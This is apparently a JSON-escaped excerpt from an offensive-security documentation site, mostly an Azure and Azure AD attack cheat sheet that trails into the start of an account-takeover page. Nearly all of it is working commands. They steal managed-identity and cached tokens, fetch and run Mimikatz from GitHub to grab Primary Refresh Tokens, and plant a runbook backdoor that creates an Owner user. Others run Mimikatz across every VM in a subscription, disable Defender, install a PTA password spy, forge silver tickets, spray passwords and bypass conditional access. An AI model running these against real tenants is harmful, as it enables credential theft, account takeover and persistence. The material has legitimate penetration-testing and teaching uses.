\u0026#39;https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/\u0026lt;RG-NAME\u0026gt;/providers/Microsoft.Compute/virtualMachines/\u0026lt;RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01\u0026#39; Azure API via Python Version # IDENTITY_ENDPOINT = os.environ[\u0026#39;IDENTITY_ENDPOINT\u0026#39;] IDENTITY_HEADER = os.environ[\u0026#39;IDENTITY_HEADER\u0026#39;] print(\u0026#34;[+] Management API\u0026#34;) cmd = \u0026#39;curl \u0026#34;%s?resource=https://management.azure.com/\u0026amp;api-version=2017-09-01\u0026#34; -H secret:%s\u0026#39; % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() print(\u0026#34;Access Token: \u0026#34;+json.loads(val)[\u0026#34;access_token\u0026#34;]) print(\u0026#34;ClientID/AccountID: \u0026#34;+json.loads(val)[\u0026#34;client_id\u0026#34;]) print(\u0026#34;\\r\\n[+] Graph API\u0026#34;) cmd = \u0026#39;curl \u0026#34;%s?resource=https://graph.microsoft.com/\u0026amp;api-version=2017-09-01\u0026#34; -H secret:%s\u0026#39; % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() print(json.loads(val)[\u0026#34;access_token\u0026#34;]) print(\u0026#34;ClientID/AccountID: \u0026#34;+json.loads(val)[\u0026#34;client_id\u0026#34;]) or inside a Python Function:\nimport logging, os import azure.functions as func def main(req: func.HttpRequest) -\u0026gt; func.HttpResponse: logging.info(\u0026#39;Python HTTP trigger function processed a request.\u0026#39;) IDENTITY_ENDPOINT = os.environ[\u0026#39;IDENTITY_ENDPOINT\u0026#39;] IDENTITY_HEADER = os.environ[\u0026#39;IDENTITY_HEADER\u0026#39;] cmd = \u0026#39;curl \u0026#34;%s?resource=https://management.azure.com\u0026amp;apiversion=2017-09-01\u0026#34; -H secret:%s\u0026#39; % (IDENTITY_ENDPOINT, IDENTITY_HEADER) val = os.popen(cmd).read() return func.HttpResponse(val, status_code=200) Get Tokens # :warning: The lifetime of a Primary Refresh Token is 14 days!\n# az cli - get tokens az account get-access-token az account get-access-token --resource-type aad-graph # or Az (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token # or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT Use Tokens # Tokens contain all the claims including that for MFA and Conditional Access\nAz Powershell PS C:\\Tools\u0026gt; $token = \u0026#39;eyJ0e..\u0026#39; PS C:\\Tools\u0026gt; Connect-AzAccount -AccessToken $token -AccountId \u0026lt;ACCOUNT-ID\u0026gt; # Access Token and Graph Token PS C:\\Tools\u0026gt; $token = \u0026#39;eyJ0eX..\u0026#39; PS C:\\Tools\u0026gt; $graphaccesstoken = \u0026#39;eyJ0eX..\u0026#39; PS C:\\Tools\u0026gt; Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId \u0026lt;ACCOUNT-ID\u0026gt; PS C:\\Tools\u0026gt; Get-AzResource # ERROR: \u0026#39;this.Client.SubscriptionId\u0026#39; cannot be null. # ---\u0026gt; The managed identity has no rights on any of the Azure resources. Switch to to GraphAPI AzureAD Import-Module C:\\Tools\\AzureAD\\AzureAD.psd1 $AADToken = \u0026#39;eyJ0…\u0026#39; Connect-AzureAD -AadAccessToken $AADToken -TenantId \u0026lt;TENANT-ID\u0026gt; -AccountId \u0026lt;ACCOUNT-ID\u0026gt; Refresh Tokens # https://github.com/ConstantinT/Lantern Lantern.exe cookie --derivedkey \u0026lt;Key from Mimikatz\u0026gt; --context \u0026lt;Context from Mimikatz\u0026gt; --prt \u0026lt;PRT from Mimikatz\u0026gt; Lantern.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename \u0026lt;Name\u0026gt; --outpfxfile \u0026lt;Some path\u0026gt; Lantern.exe token --username \u0026lt;Username\u0026gt; --password \u0026lt;Password\u0026gt; Lantern.exe token --refreshtoken \u0026lt;RefreshToken\u0026gt; Lantern.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password ) https://github.com/rvrsh3ll/TokenTactics Import-Module .\\TokenTactics.psd1 CommandType Name Version Source ----------- ---- ------- ------ Function Clear-Token 0.0.1 TokenTactics Function Dump-OWAMailboxViaMSGraphApi 0.0.1 TokenTactics Function Forge-UserAgent 0.0.1 TokenTactics Function Get-AzureToken 0.0.1 TokenTactics Function Get-TenantID 0.0.1 TokenTactics Function Open-OWAMailboxInBrowser 0.0.1 TokenTactics Function Parse-JWTtoken 0.0.1 TokenTactics Function RefreshTo-AzureCoreManagementToken 0.0.1 TokenTactics Function RefreshTo-AzureManagementToken 0.0.1 TokenTactics Function RefreshTo-DODMSGraphToken 0.0.1 TokenTactics Function RefreshTo-GraphToken 0.0.1 TokenTactics Function RefreshTo-MAMToken 0.0.1 TokenTactics Function RefreshTo-MSGraphToken 0.0.1 TokenTactics Function RefreshTo-MSManageToken 0.0.1 TokenTactics Function RefreshTo-MSTeamsToken 0.0.1 TokenTactics Function RefreshTo-O365SuiteUXToken 0.0.1 TokenTactics Function RefreshTo-OfficeAppsToken 0.0.1 TokenTactics Function RefreshTo-OfficeManagementToken 0.0.1 TokenTactics Function RefreshTo-OutlookToken 0.0.1 TokenTactics Function RefreshTo-SubstrateToken 0.0.1 TokenTactics Stealing Tokens # Get-AzurePasswords Import-Module Microburst.psm1 Get-AzurePasswords Get-AzurePasswords -Verbose | Out-GridView Stealing tokens from az cli # az cli stores access tokens in clear text in accessTokens.json in the directory C:\\Users\\\u0026lt;username\u0026gt;\\.Azure azureProfile.json in the same directory contains information about subscriptions. Stealing tokens from az powershell # Az PowerShell stores access tokens in clear text in TokenCache.dat in the directory C:\\Users\\\u0026lt;username\u0026gt;\\.Azure It also stores ServicePrincipalSecret in clear-text in AzureRmContext.json Users can save tokens using Save-AzContext Add credentials to all Enterprise Applications # # Add secrets PS \u0026gt; . C:\\Tools\\Add-AzADAppSecret.ps1 PS \u0026gt; Add-AzADAppSecret -GraphToken $graphtoken -Verbose # Use secrets to authenticate as Service Principal PS \u0026gt; $password = ConvertTo-SecureString \u0026#39;\u0026lt;SECRET/PASSWORD\u0026gt;\u0026#39; -AsPlainText -Force PS \u0026gt; $creds = New-Object System.Management.Automation.PSCredential(\u0026#39;\u0026lt;AppID\u0026gt;\u0026#39;, $password) PS \u0026gt; Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant \u0026#39;\u0026lt;TenantID\u0026gt;\u0026#39; Spawn SSH for Azure Web App # az webapp create-remote-connection --subscription \u0026lt;SUBSCRIPTION-ID\u0026gt; --resource-group \u0026lt;RG-NAME\u0026gt; -n \u0026lt;APP-SERVICE-NAME\u0026gt; Azure Storage Blob # Blobs - *.blob.core.windows.net File Services - *.file.core.windows.net Data Tables - *.table.core.windows.net Queues - *.queue.core.windows.net Enumerate blobs # PS \u0026gt; . C:\\Tools\\MicroBurst\\Misc\\InvokeEnumerateAzureBlobs.ps1 PS \u0026gt; Invoke-EnumerateAzureBlobs -Base \u0026lt;SHORT DOMAIN\u0026gt; -OutputFile azureblobs.txt Found Storage Account - testsecure.blob.core.windows.net Found Storage Account - securetest.blob.core.windows.net Found Storage Account - securedata.blob.core.windows.net Found Storage Account - securefiles.blob.core.windows.net SAS URL # Use Storage Explorer Click on Open Connect Dialog in the left menu. Select Blob container. On the Select Authentication Method page Select Shared access signature (SAS) and click on Next Copy the URL in Blob container SAS URL field. :warning: You can also use subscription(username/password) to access storage resources such as blobs and files.\nList and download blobs # PS Az\u0026gt; Get-AzResource PS Az\u0026gt; Get-AzStorageAccount -name \u0026lt;NAME\u0026gt; -ResourceGroupName \u0026lt;NAME\u0026gt; PS Az\u0026gt; Get-AzStorageContainer -Context (Get-AzStorageAccount -name \u0026lt;NAME\u0026gt; -ResourceGroupName \u0026lt;NAME\u0026gt;).context PS Az\u0026gt; Get-AzStorageBlobContent -Container \u0026lt;NAME\u0026gt; -Context (Get-AzStorageAccount -name \u0026lt;NAME\u0026gt; -ResourceGroupName \u0026lt;NAME\u0026gt;).context -Blob Runbook Automation # Create a Runbook # # Check user right for automation az extension add --upgrade -n automation az automation account list # if it doesn\u0026#39;t return anything the user is not a part of an Automation group az ad signed-in-user list-owned-objects # If the user is not part of an \u0026#34;Automation\u0026#34; group. # Add him to a custom group , e.g: \u0026#34;Automation Admins\u0026#34; Add-AzureADGroupMember -ObjectId \u0026lt;OBJID\u0026gt; -RefObjectId \u0026lt;REFOBJID\u0026gt; -Verbose # Get the role of a user on the Automation account # Contributor or higher = Can create and execute Runbooks Get-AzRoleAssignment -Scope /subscriptions/\u0026lt;ID\u0026gt;/resourceGroups/\u0026lt;RG-NAME\u0026gt;/providers/Microsoft.Automation/automationAccounts/\u0026lt;AUTOMATION-ACCOUNT\u0026gt; # List hybrid workers Get-AzAutomationHybridWorkerGroup -AutomationAccountName \u0026lt;AUTOMATION-ACCOUNT\u0026gt; -ResourceGroupName \u0026lt;RG-NAME\u0026gt; # Create a Powershell Runbook PS C:\\Tools\u0026gt; Import-AzAutomationRunbook -Name \u0026lt;RUNBOOK-NAME\u0026gt; -Path C:\\Tools\\username.ps1 -AutomationAccountName \u0026lt;AUTOMATION-ACCOUNT\u0026gt; -ResourceGroupName \u0026lt;RG-NAME\u0026gt; -Type PowerShell -Force -Verbose # Publish the Runbook Publish-AzAutomationRunbook -RunbookName \u0026lt;RUNBOOK-NAME\u0026gt; -AutomationAccountName \u0026lt;AUTOMATION-ACCOUNT\u0026gt; -ResourceGroupName \u0026lt;RG-NAME\u0026gt; -Verbose # Start the Runbook Start-AzAutomationRunbook -RunbookName \u0026lt;RUNBOOK-NAME\u0026gt; -RunOn Workergroup1 -AutomationAccountName \u0026lt;AUTOMATION-ACCOUNT\u0026gt; -ResourceGroupName \u0026lt;RG-NAME\u0026gt; -Verbose Persistence via Automation accounts # Create a new Automation Account \u0026ldquo;Create Azure Run As account\u0026rdquo;: Yes Import a new runbook that creates an AzureAD user with Owner permissions for the subscription* Sample runbook for this Blog located here – https://github.com/NetSPI/MicroBurst Publish the runbook Add a webhook to the runbook Add the AzureAD module to the Automation account Update the Azure Automation Modules Assign \u0026ldquo;User Administrator\u0026rdquo; and \u0026ldquo;Subscription Owner\u0026rdquo; rights to the automation account Eventually lose your access… Trigger the webhook with a post request to create the new user $uri = \u0026#34;https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d\u0026#34; $AccountInfo = @(@{RequestBody=@{Username=\u0026#34;BackdoorUsername\u0026#34;;Password=\u0026#34;BackdoorPassword\u0026#34;}}) $body = ConvertTo-Json -InputObject $AccountInfo $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body Virtual Machine RunCommand # Requirements:\nMicrosoft.Compute/virtualMachines/runCommand/action # Get Public IP of VM : query the network interface PS AzureAD\u0026gt; Get-AzVM -Name \u0026lt;RESOURCE\u0026gt; -ResourceGroupName \u0026lt;RG-NAME\u0026gt; | select -ExpandProperty NetworkProfile PS AzureAD\u0026gt; Get-AzNetworkInterface -Name \u0026lt;RESOURCE368\u0026gt; PS AzureAD\u0026gt; Get-AzPublicIpAddress -Name \u0026lt;RESOURCEIP\u0026gt; # Execute Powershell script on the VM PS AzureAD\u0026gt; Invoke-AzVMRunCommand -VMName \u0026lt;RESOURCE\u0026gt; -ResourceGroupName \u0026lt;RG-NAME\u0026gt; -CommandId \u0026#39;RunPowerShellScript\u0026#39; -ScriptPath \u0026#39;C:\\Tools\\adduser.ps1\u0026#39; -Verbose # Connect via WinRM PS C:\\Tools\u0026gt; $password = ConvertTo-SecureString \u0026#39;\u0026lt;PASSWORD\u0026gt;\u0026#39; -AsPlainText -Force PS C:\\Tools\u0026gt; $creds = New-Object System.Management.Automation.PSCredential(\u0026#39;username\u0026#39;, $Password) PS C:\\Tools\u0026gt; $sess = New-PSSession -ComputerName \u0026lt;IP\u0026gt; -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer) PS C:\\Tools\u0026gt; Enter-PSSession $sess Allow anyone with \u0026ldquo;Contributor\u0026rdquo; rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\\System\n# List available VMs PS C:\\\u0026gt; Get-AzureRmVM -status | where {$_.PowerState -EQ \u0026#34;VM running\u0026#34;} | select ResourceGroupName,Name ResourceGroupName Name ----------------- ---- TESTRESOURCES Remote-Test # Execute Powershell script on the VM PS C:\\\u0026gt; Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1 Against the whole subscription using MicroBurst.ps1\nImport-module MicroBurst.psm1 Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt KeyVault Secrets # # keyvault access token curl \u0026#34;$IDENTITY_ENDPOINT?resource=https://vault.azure.net\u0026amp;apiversion=2017-09-01\u0026#34; -H secret:$IDENTITY_HEADER curl \u0026#34;$IDENTITY_ENDPOINT?resource=https://management.azure.com\u0026amp;apiversion=2017-09-01\u0026#34; -H secret:$IDENTITY_HEADER # connect PS\u0026gt; $token = \u0026#39;eyJ0..\u0026#39; PS\u0026gt; $keyvaulttoken = \u0026#39;eyJ0..\u0026#39; PS Az\u0026gt; Connect-AzAccount -AccessToken $token -AccountId 2e91a4fea0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken # query the vault and the secrets PS Az\u0026gt; Get-AzKeyVault PS Az\u0026gt; Get-AzKeyVaultSecret -VaultName ResearchKeyVault PS Az\u0026gt; Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText Pass The PRT # MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).\n# Run mimikatz to obtain the PRT PS\u0026gt; iex (New-Object Net.Webclient).downloadstring(\u0026#34;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1\u0026#34;) PS\u0026gt; Invoke-Mimikatz -Command \u0026#39;\u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::cloudap\u0026#34;\u0026#39; # Copy the PRT and KeyValue Mimikatz\u0026gt; privilege::debug Mimikatz\u0026gt; token::elevate Mimikatz\u0026gt; dpapi::cloudapkd /keyvalue:\u0026lt;KeyValue\u0026gt; /unprotect # Copy the Context, ClearKey and DerivedKey Mimikatz\u0026gt; dpapi::cloudapkd /context:\u0026lt;Context\u0026gt; /derivedkey:\u0026lt;DerivedKey\u0026gt; /Prt:\u0026lt;PRT\u0026gt; # Generate a JWT PS\u0026gt; Import-Module C:\\Tools\\AADInternals\\AADInternals.psd1 PS AADInternals\u0026gt; $PRT_OF_USER = \u0026#39;...\u0026#39; PS AADInternals\u0026gt; while($PRT_OF_USER.Length % 4) {$PRT_OF_USER += \u0026#34;=\u0026#34;} PS AADInternals\u0026gt; $PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($PRT_OF_USER)) PS AADInternals\u0026gt; $ClearKey = \u0026#34;XXYYZZ...\u0026#34; PS AADInternals\u0026gt; $SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace \u0026#39;..\u0026#39;, \u0026#39;0x$\u0026amp;,\u0026#39; -split \u0026#39;,\u0026#39; -ne \u0026#39;\u0026#39;)) PS AADInternals\u0026gt; New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce eyJ0eXAiOiJKV1QiL... The \u0026lt;Signed JWT\u0026gt; (JSON Web Token) can be used as PRT cookie in a (anonymous) browser session for https://login.microsoftonline.com/login.srf. Edit the Chrome cookie (F12) -\u0026gt; Application -\u0026gt; Cookies with the values:\nName: x-ms-RefreshTokenCredential Value: \u0026lt;Signed JWT\u0026gt; HttpOnly: √ :warning: Mark the cookie with the flags HTTPOnly and Secure.\nPass The Certificate # Copy-Item -ToSession $jumpvm -Path C:\\Tools\\PrtToCertmaster.zip -Destination C:\\Users\\Username\\Documents\\username –Verbose Expand-Archive -Path C:\\Users\\Username\\Documents\\username\\PrtToCert-master.zip -DestinationPath C:\\Users\\Username\\Documents\\username\\PrtToCert # Require the PRT, TenantID, Context and DerivedKey \u0026amp; \u0026#39;C:\\Program Files\\Python39\\python.exe\u0026#39; C:\\Users\\Username\\Documents\\username\\PrtToCert\\RequestCert.py --tenantId \u0026lt;TENANT-ID\u0026gt; --prt \u0026lt;PRT\u0026gt; --userName \u0026lt;Username\u0026gt;@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com --hexCtx \u0026lt;HEX-CONTEXT\u0026gt; --hexDerivedKey \u0026lt;HEX-DERIVED-KEY\u0026gt; # PFX saved with the name \u0026lt;Username\u0026gt;@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com.pfx and password AzureADCert Python tool that will authenticate to the remote machine, run PSEXEC and open a CMD on the victim machine\nhttps://github.com/morRubin/AzureADJoinedMachinePTC\nMain.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP Main.py --usercert \u0026#34;admin.pfx\u0026#34; --certpass password --remoteip 10.10.10.10 python Main.py --usercert C:\\Users\\Username\\Documents\\username\\\u0026lt;USERNAME\u0026gt;@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com.pfx -- certpass AzureADCert --remoteip 10.10.10.10 --command \u0026#34;cmd.exe /c net user username Password@123 /add /Y \u0026amp;\u0026amp; net localgroup administrators username /add\u0026#34; Intunes Administration # Requirements:\nGlobal Administrator or Intune Administrator Privilege : Get-AzureADGroup -Filter \u0026quot;DisplayName eq 'Intune Administrators'\u0026quot; Login into https://endpoint.microsoft.com/#home or use Pass-The-PRT Go to Devices -\u0026gt; All Devices to check devices enrolled to Intune Go to Scripts and click on Add for Windows 10. Add a Powershell script Specify Add all users and Add all devices in the Assignments page. :warning: It will take up to one hour before you script is executed !\nDynamic Group Membership # Get groups that allow Dynamic membership: Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}\nRule example : (user.otherMails -any (_ -contains \u0026quot;vendor\u0026quot;)) -and (user.userType -eq \u0026quot;guest\u0026quot;) Rule description: Any Guest user whose secondary email contains the string \u0026lsquo;vendor\u0026rsquo; will be added to the group\nOpen user\u0026rsquo;s profile, click on Manage Click on Resend invite and to get an invitation URL Set the secondary email PS\u0026gt; Set-AzureADUser -ObjectId \u0026lt;OBJECT-ID\u0026gt; -OtherMails \u0026lt;Username\u0026gt;@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com -Verbose Administrative Unit # Administrative Unit can reset password of another user\nPS AzureAD\u0026gt; Get-AzureADMSAdministrativeUnit -Id \u0026lt;ID\u0026gt; PS AzureAD\u0026gt; Get-AzureADMSAdministrativeUnitMember -Id \u0026lt;ID\u0026gt; PS AzureAD\u0026gt; Get-AzureADMSScopedRoleMembership -Id \u0026lt;ID\u0026gt; | fl PS AzureAD\u0026gt; Get-AzureADDirectoryRole -ObjectId \u0026lt;RoleId\u0026gt; PS AzureAD\u0026gt; Get-AzureADUser -ObjectId \u0026lt;RoleMemberInfo.Id\u0026gt; | fl PS C:\\Tools\u0026gt; $password = \u0026#34;Password\u0026#34; | ConvertToSecureString -AsPlainText -Force PS C:\\Tools\u0026gt; (Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq \u0026#34;\u0026lt;Username\u0026gt;@\u0026lt;TENANT NAME\u0026gt;.onmicrosoft.com\u0026#34;}).ObjectId | SetAzureADUserPassword -Password $Password -Verbose Deployment Template # PS Az\u0026gt; Get-AzResourceGroup PS Az\u0026gt; Get-AzResourceGroupDeployment -ResourceGroupName SAP # Export PS Az\u0026gt; Save-AzResourceGroupDeploymentTemplate -ResourceGroupName \u0026lt;RESOURCE GROUP\u0026gt; -DeploymentName \u0026lt;DEPLOYMENT NAME\u0026gt; cat \u0026lt;DEPLOYMENT NAME\u0026gt;.json # search for hardcoded password cat \u0026lt;PATH TO .json FILE\u0026gt; | Select-String password Application Proxy # # Enumerate application that have Proxy PS C:\\Tools\u0026gt; Get-AzureADApplication | %{try{GetAzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}} PS C:\\Tools\u0026gt; Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq \u0026#34;Finance Management System\u0026#34;} PS C:\\Tools\u0026gt; . C:\\Tools\\GetApplicationProxyAssignedUsersAndGroups.ps1 PS C:\\Tools\u0026gt; Get-ApplicationProxyAssignedUsersAndGroups -ObjectId \u0026lt;OBJECT-ID\u0026gt; Conditional Access # Bypassing conditional access by copying User-Agent (Chrome Dev Tool \u0026gt; Select iPad Pro, etc) Bypassing conditional access by faking device compliance # AAD Internals - Making your device compliant # Get an access token for AAD join and save to cache Get-AADIntAccessTokenForAADJoin -SaveToCache # Join the device to Azure AD Join-AADIntDeviceToAzureAD -DeviceName \u0026#34;SixByFour\u0026#34; -DeviceType \u0026#34;Commodore\u0026#34; -OSVersion \u0026#34;C64\u0026#34; # Marking device compliant - option 1: Registering device to Intune # Get an access token for Intune MDM and save to cache (prompts for credentials) Get-AADIntAccessTokenForIntuneMDM -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx -SaveToCache # Join the device to Intune Join-AADIntDeviceToIntune -DeviceName \u0026#34;SixByFour\u0026#34; # Start the call back Start-AADIntDeviceIntuneCallback -PfxFileName .\\d03994c9-24f8-41ba-a156-1805998d6dc7-MDM.pfx -DeviceName \u0026#34;SixByFour\u0026#34; Azure AD # With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD.\nAuthenticate to your webmail portal (i.e. https://webmail.domain.com/) Change your browser URL to: https://azure.microsoft.com/ Pick the account from the active sessions Select Azure Active Directory and enjoy! Azure AD vs Active Directory # Active Directory Azure AD LDAP REST API\u0026rsquo;S NTLM/Kerberos OAuth/SAML/OpenID Structured directory (OU tree) Flat structure GPO No GPO\u0026rsquo;s Super fine-tuned access controls Predefined roles Domain/forest Tenant Trusts Guests Password Hash Syncronization (PHS)\nPasswords from on-premise AD are sent to the cloud Use replication via a service account created by AD Connect Pass Through Authentication (PTA)\nPossible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text Connect Windows Server AD to Azure AD using Federation Server (ADFS)\nDir-Sync : Handled by on-premise Windows Server AD, sync username/password Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg\u0026name=large\nWorkplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg\u0026name=large\nHybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg\u0026name=large\nWorkplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg\u0026name=large\nPassword Spray # Default lockout policy of 10 failed attempts, locking out an account for 60 seconds\ngit clone https://github.com/dafthack/MSOLSpray Import-Module .\\MSOLSpray.ps1 Invoke-MSOLSpray -UserList .\\userlist.txt -Password Winter2020 Invoke-MSOLSpray -UserList .\\users.txt -Password d0ntSprayme! # UserList - UserList file filled with usernames one-per-line in the format \u0026#34;user@domain.com\u0026#34; # Password - A single password that will be used to perform the password spray. # OutFile - A file to output valid results to. # Force - Forces the spray to continue and not stop when multiple account lockouts are detected. # URL - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from. Convert GUID to SID # The user\u0026rsquo;s AAD id is translated to SID by concatenating \u0026quot;S-1–12–1-\u0026quot; to the decimal representation of each section of the AAD Id.\nGUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)] SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)] For example, the representation of 6aa89ecb-1f8f-4d92–810d-b0dce30b6c82 is S-1–12–1–1789435595–1301421967–3702525313–2188119011\nAzure AD Connect # Check if Azure AD Connect is installed : Get-ADSyncConnector\nFor PHS, we can extract the credentials For PTA, we can install the agent For Federation, we can extract the certificate from ADFS server using DA PS \u0026gt; Set-MpPreference -DisableRealtimeMonitoring $true PS \u0026gt; Copy-Item -ToSession $adcnct -Path C:\\Tools\\AADInternals.0.4.5.zip -Destination C:\\Users\\Administrator\\Documents PS \u0026gt; Expand-Archive C:\\Users\\Administrator\\Documents\\AADInternals.0.4.5.zip -DestinationPath C:\\Users\\Administrator\\Documents\\AADInternals PS \u0026gt; Import-Module C:\\Users\\Administrator\\Documents\\AADInternals\\AADInternals.psd1 PS \u0026gt; Get-AADIntSyncCredentials # Get Token for SYNC account and reset on-prem admin password PS \u0026gt; $passwd = ConvertToSecureString \u0026#39;password\u0026#39; -AsPlainText -Force PS \u0026gt; $creds = New-Object System.Management.Automation.PSCredential (\u0026#34;\u0026lt;Username\u0026gt;@\u0026lt;TenantName\u0026gt;.onmicrosoft.com\u0026#34;, $passwd) PS \u0026gt; GetAADIntAccessTokenForAADGraph -Credentials $creds –SaveToCache PS \u0026gt; Get-AADIntUser -UserPrincipalName onpremadmin@defcorpsecure.onmicrosoft.com | select ImmutableId PS \u0026gt; Set-AADIntUserPassword -SourceAnchor \u0026#34;\u0026lt;IMMUTABLE-ID\u0026gt;\u0026#34; -Password \u0026#34;Password\u0026#34; -Verbose Check if PTA is installed : Get-Command -Module PassthroughAuthPSModule Install a PTA Backdoor PS AADInternals\u0026gt; Install-AADIntPTASpy PS AADInternals\u0026gt; Get-AADIntPTASpyLog -DecodePasswords Azure AD Connect - Password extraction # Credentials in AD Sync : C:\\Program Files\\Microsoft Azure AD Sync\\Data\\ADSync.mdf\nTool Requires code execution on target DLL dependencies Requires MSSQL locally Requires python locally ADSyncDecrypt Yes Yes No No ADSyncGather Yes No No Yes ADSyncQuery No (network RPC calls only) No Yes Yes git clone https://github.com/fox-it/adconnectdump # DCSync with AD Sync account Azure AD Connect - MSOL Account\u0026rsquo;s password and DCSync # You can perform DCSync attack using the MSOL account.\nRequirements:\nCompromise a server with Azure AD Connect service Access to ADSyncAdmins or local Administrators groups Use the script azuread_decrypt_msol.ps1 from @xpn to recover the decrypted password for the MSOL account:\nazuread_decrypt_msol.ps1: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545 azuread_decrypt_msol_v2.ps1: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.\nAzure AD Connect - Seamless Single Sign On Silver Ticket # Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)\nSeamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account AZUREADSSOC is created in the on-prem AD.\n:warning: The password of the AZUREADSSOACC account never changes.\nUsing https://autologon.microsoftazuread-sso.com/ to convert Kerberos tickets to SAML and JWT for Office 365 \u0026amp; Azure\nNTLM password hash of the AZUREADSSOACC account, e.g. f9969e088b2c13d93833d0ce436c76dd. mimikatz.exe \u0026#34;lsadump::dcsync /user:AZUREADSSOACC$\u0026#34; exit AAD logon name of the user we want to impersonate, e.g. elrond@contoso.com. This is typically either his userPrincipalName or mail attribute from the on-prem AD. SID of the user we want to impersonate, e.g. S-1-5-21-2121516926-2695913149-3163778339-1234. Create the Silver Ticket and inject it into Kerberos cache: mimikatz.exe \u0026#34;kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt\u0026#34; exit Launch Mozilla Firefox Go to about:config and set the network.negotiate-auth.trusted-uris preference to value https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty. References # Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !! Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9 Azure AD Pass The Certificate - Mor - Aug 19, 2020 Get Access Tokens for Managed Service Identity on Azure App Service Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen An introduction to penetration testing Azure - Akimbocore Running Powershell scripts on Azure VM - Netspi Attacking Azure Cloud shell - Netspi Maintaining Azure Persistence via automation accounts - Netspi Detecting an attacks on active directory with Azure - Smartspate Azure AD Overview Windows Azure Active Directory in plain English Building Free Active Directory Lab in Azure - @kamran.bilgrami Attacking Azure/Azure AD and introducing Powerzure - SpecterOps Azure AD connect for RedTeam - @xpnsec Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020 Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020 Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020 AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20 Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter The Art of the Device Code Phish - Bobby Cooke AZURE AD cheatsheet - BlackWasp "},{"id":10,"href":"/docs/checking_for_account_takeover/","title":"Account Takeovers","section":"Docs","content":" Account Takeover # Password Reset Feature # Password Reset Token Leak Via Referrer # Request password reset to your email address Click on the password reset link Don\u0026rsquo;t change password Click any 3rd party websites(eg: Facebook, 